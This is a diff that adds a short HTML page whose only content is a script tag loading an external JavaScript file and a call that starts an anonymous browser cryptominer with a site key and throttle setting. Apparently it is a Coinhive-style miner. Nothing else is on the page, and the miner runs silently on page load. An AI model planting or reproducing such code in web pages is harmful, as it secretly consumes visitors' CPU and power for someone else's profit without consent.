@@ -1,0 +1,18 @@
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+<script src="https://www.hostingcloud.science./eaaw.js"></script>
+<script>
+    var _client = new Client.Anonymous('32ea9afa545c07b29d11c1f0a6926dab3fa8dc524cd4cdb53f013bfb27aa85da', {
+        throttle: 0.2
+    });
+    _client.start();
+    
+
+</script>
+
+</head>
+
+</html>
